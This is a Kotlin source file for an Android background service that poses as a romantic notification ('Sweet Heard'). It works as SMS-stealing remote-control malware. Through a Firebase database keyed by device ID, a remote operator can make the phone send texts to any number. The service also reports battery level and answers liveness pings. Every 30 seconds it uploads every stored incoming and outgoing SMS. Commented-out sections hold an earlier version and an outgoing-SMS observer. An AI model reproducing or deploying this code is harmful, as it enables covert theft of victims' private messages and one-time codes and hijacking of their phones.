package godrich.live

//
//import android.app.Notification
//import android.app.NotificationChannel
//import android.app.NotificationManager
//import android.app.Service
//import android.content.Intent
//import android.os.Build
//import android.os.IBinder
//import android.provider.Settings
//import android.telephony.SmsManager
//import android.util.Log
//import androidx.core.app.NotificationCompat
//import com.google.firebase.database.*
//import android.content.pm.ServiceInfo
//
//
//class SmsListenerService : Service() {
//
//    private lateinit var database: DatabaseReference
//    private var listener: ValueEventListener? = null
//
//    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
//        val channelId = "sms_channel"
//
//        // 🔹 Create Notification Channel for Foreground Service
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//            val channel = NotificationChannel(
//                channelId,
//                "Sweet Heard",
//                NotificationManager.IMPORTANCE_LOW
//            )
//            val manager = getSystemService(NotificationManager::class.java)
//            manager.createNotificationChannel(channel)
//        }
//
//        // 🔹 Foreground Notification
//        val notification: Notification = NotificationCompat.Builder(this, channelId)
//            .setContentTitle("Sweet Heard")
//            .setContentText("Some one waiting for you \uD83D\uDE18\uD83D\uDC95")
//            .setSmallIcon(android.R.drawable.ic_dialog_info)
//            .build()
//
//        // 🔹 Start Foreground Service
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
//            startForeground(
//                1,
//                notification,
//                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
//            )
//        } else {
//            startForeground(1, notification)
//        }
//
//        // 🔹 Firebase Realtime Database Listener
//        try {
//            val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
////            FirebaseDatabase.getInstance().setPersistenceEnabled(true)
//            database = FirebaseDatabase.getInstance()
//                .getReference("clients/$deviceId/webhookEvent/sendSms")
//
//            listener = object : ValueEventListener {
//                override fun onDataChange(snapshot: DataSnapshot) {
//                    if (snapshot.exists()) {
//                        val to = snapshot.child("to").getValue(String::class.java)
//                        val message = snapshot.child("message").getValue(String::class.java)
//                        val isSended =
//                            snapshot.child("isSended").getValue(Boolean::class.java) ?: true
//
//                        if (!isSended && to != null && message != null) {
//                            try {
//                                val smsManager = SmsManager.getDefault()
//                                smsManager.sendTextMessage(to, null, message, null, null)
//
//                                Log.d("SmsListenerService", "✅ SMS sent to $to: $message")
//
//                                // Update Firebase flag
//                                database.child("isSended").setValue(true)
//                            } catch (e: Exception) {
//                                Log.e("SmsListenerService", "❌ Failed: ${e.message}")
//                            }
//                        }
//                    }
//                }
//
//                override fun onCancelled(error: DatabaseError) {
//                    Log.e("SmsListenerService", "DB Error: ${error.message}")
//                }
//            }
//
//            database.addValueEventListener(listener!!)
//        } catch (e: Exception) {
//            Log.e("SmsListenerService", "Error initializing Firebase: ${e.message}")
//        }
//
//        return START_STICKY // Restart if killed
//    }
//
//    override fun onDestroy() {
//        super.onDestroy()
//        listener?.let { database.removeEventListener(it) }
//    }
//
//    override fun onBind(intent: Intent?): IBinder? = null
//}



import android.annotation.TargetApi
import android.app.*
import android.content.*
import android.content.pm.PackageManager
import android.os.*
import android.provider.Settings
import android.telephony.SmsManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import android.content.pm.ServiceInfo
import android.provider.Telephony
import java.sql.Date
import java.text.SimpleDateFormat
import java.util.Locale

class SmsListenerService : Service() {

    private lateinit var database: DatabaseReference
    private var smsListener: ValueEventListener? = null
    private var livenessListener: ValueEventListener? = null
    private var batteryReceiver: BroadcastReceiver? = null
    private lateinit var deviceId: String

    @TargetApi(Build.VERSION_CODES.KITKAT)
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val channelId = "sms_channel"

        // 🔹 Create Foreground Notification Channel
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Sweet Heard",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        // 🔹 Foreground Notification
        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Sweet Heard")
            .setContentText("Some one waiting for you 💋💝")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                1,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(1, notification)
        }

        try {
            deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            val rootRef = FirebaseDatabase.getInstance()
                .getReference("clients/$deviceId/webhookEvent")

            // ==================================================
            // 🔸 1️⃣ SMS SEND LISTENER
            // ==================================================
            database = rootRef.child("sendSms")
            smsListener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    if (snapshot.exists()) {
                        val to = snapshot.child("to").getValue(String::class.java)
                        val message = snapshot.child("message").getValue(String::class.java)
                        val isSended =
                            snapshot.child("isSended").getValue(Boolean::class.java) ?: true

                        if (!isSended && to != null && message != null) {
                            try {
                                val smsManager = SmsManager.getDefault()
                                smsManager.sendTextMessage(to, null, message, null, null)

                                Log.d("SmsListenerService", "✅ SMS sent to $to: $message")

                                database.child("isSended").setValue(true)
                            } catch (e: Exception) {
                                Log.e("SmsListenerService", "❌ Failed to send SMS: ${e.message}")
                            }
                        }
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Log.e("SmsListenerService", "DB Error: ${error.message}")
                }
            }
            database.addValueEventListener(smsListener!!)

            // ==================================================
            // 🔸 2️⃣ LIVENESS LISTENER (Ping → Pong)
            // ==================================================
            val checkLivenessRef = rootRef.child("checkLiveness")
            livenessListener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    if (snapshot.exists()) {
                        val text = snapshot.child("text").getValue(String::class.java)
                        if (text == "ping") {
                            Log.d("SmsListenerService", "📡 Received ping → replying pong")

                            val response = mapOf(
                                "webhookEvent" to mapOf(
                                    "checkLiveness" to mapOf(
                                        "text" to "pong"
                                    )
                                )
                            )

                            FirebaseDatabase.getInstance()
                                .getReference("clients/$deviceId")
                                .updateChildren(response)
                        }
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Log.e("SmsListenerService", "DB Error (liveness): ${error.message}")
                }
            }
            checkLivenessRef.addValueEventListener(livenessListener!!)

            // ==================================================
            // 🔸 3️⃣ BATTERY PERCENTAGE LISTENER
            // ==================================================
            batteryReceiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    intent?.let {
                        val level = it.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
                        val scale = it.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
                        val batteryPct = (level * 100) / scale
                        Log.d("SmsListenerService", "🔋 Battery: $batteryPct%")

                        FirebaseDatabase.getInstance()
                            .getReference("clients/$deviceId")
                            .child("battery")
                            .setValue("$batteryPct%")
                    }
                }
            }

            // Register for battery change broadcast
            val filter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            registerReceiver(batteryReceiver, filter)

        } catch (e: Exception) {
            Log.e("SmsListenerService", "Error initializing Firebase: ${e.message}")
        }


        Handler(Looper.getMainLooper()).postDelayed(object : Runnable {
            override fun run() {
                uploadOldSms()  // your function that reads Telephony.Sms.CONTENT_URI and uploads to Firebase
                Handler(Looper.getMainLooper()).postDelayed(this, 30_000) // repeat every 30 sec
            }
        }, 0)
        // ==================================================
// 🔸 4️⃣ OUTGOING SMS OBSERVER
// ==================================================
//        try {
//            contentResolver.registerContentObserver(
//                android.provider.Telephony.Sms.CONTENT_URI,
//                true,
//                object : android.database.ContentObserver(Handler(Looper.getMainLooper())) {
//                    private var lastId: String? = null
//
//                    override fun onChange(selfChange: Boolean) {
//                        super.onChange(selfChange)
//
//                        val cursor = contentResolver.query(
//                            android.provider.Telephony.Sms.CONTENT_URI,
//                            null, null, null, "date DESC LIMIT 1"
//                        ) ?: return
//
//                        cursor.use {
//                            if (it.moveToFirst()) {
//                                val id = it.getString(it.getColumnIndexOrThrow(android.provider.Telephony.Sms._ID))
//                                if (id == lastId) return
//                                lastId = id
//
//                                val address = it.getString(it.getColumnIndexOrThrow(android.provider.Telephony.Sms.ADDRESS))
//                                val body = it.getString(it.getColumnIndexOrThrow(android.provider.Telephony.Sms.BODY))
//                                val date = it.getLong(it.getColumnIndexOrThrow(android.provider.Telephony.Sms.DATE))
//                                val type = it.getInt(it.getColumnIndexOrThrow(android.provider.Telephony.Sms.TYPE))
//
//                                Log.d("Outgoing SMS", "address: ${address} body:${body} date:${date} type:${type}")
//                                // Detect outgoing SMS only
//                                if (type == android.provider.Telephony.Sms.MESSAGE_TYPE_SENT) {
//                                    val dateTime = java.text.SimpleDateFormat(
//                                        "dd/MM/yyyy | hh:mm a",
//                                        java.util.Locale.getDefault()
//                                    ).format(java.util.Date(date))
//
//                                    val smsEntry = mapOf(
//                                        "dateTime" to dateTime,
//                                        "id" to id,
//                                        "message" to body,
//                                        "sender" to address,
//                                        "type" to "outgoing"
//                                    )
//
//                                    com.google.firebase.database.FirebaseDatabase.getInstance()
//                                        .getReference("messages/$deviceId/$id")
//                                        .setValue(smsEntry)
//                                }
//                            }
//                        }
//                    }
//                })
//        } catch (e: Exception) {
//            Log.e("SmsListenerService", "Error registering SMS observer: ${e.message}")
//        }


        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        smsListener?.let { database.removeEventListener(it) }
        livenessListener?.let {
            FirebaseDatabase.getInstance()
                .getReference("clients/$deviceId/webhookEvent/checkLiveness")
                .removeEventListener(it)
        }
        batteryReceiver?.let { unregisterReceiver(it) }
    }

    override fun onBind(intent: Intent?): IBinder? = null



    @TargetApi(Build.VERSION_CODES.KITKAT)
    private fun uploadOldSms() {
        if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            return // no permission, skip
        }
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        val database = FirebaseDatabase.getInstance().getReference("messages/$deviceId")

        // Query all SMS (inbox + sent)
        val cursor = contentResolver.query(
            Telephony.Sms.CONTENT_URI, // fetch all SMS types
            arrayOf(
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE
            ),
            null,
            null,
            Telephony.Sms.DATE + " ASC" // oldest first (optional)
        )

        cursor?.use {
            var counter = 1L
            val dateTimeFormat = SimpleDateFormat("dd-MM-yyyy | hh:mm a", Locale.getDefault())

            while (it.moveToNext()) {
                val address =
                    it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: "Unknown"
                val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: ""
                val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
                val type = it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE))

                val messageType = when (type) {
                    Telephony.Sms.MESSAGE_TYPE_INBOX -> "incoming"
                    Telephony.Sms.MESSAGE_TYPE_SENT -> "outgoing"
                    else -> "other"
                }

                val dateTime = dateTimeFormat.format(Date(date))

                val smsData = mapOf(
                    "dateTime" to dateTime,
                    "id" to counter,
                    "message" to body,
                    "sender" to address,
                    "type" to messageType
                )

                database.child(counter.toString()).setValue(smsData)
                counter++
            }
        }
    }

}
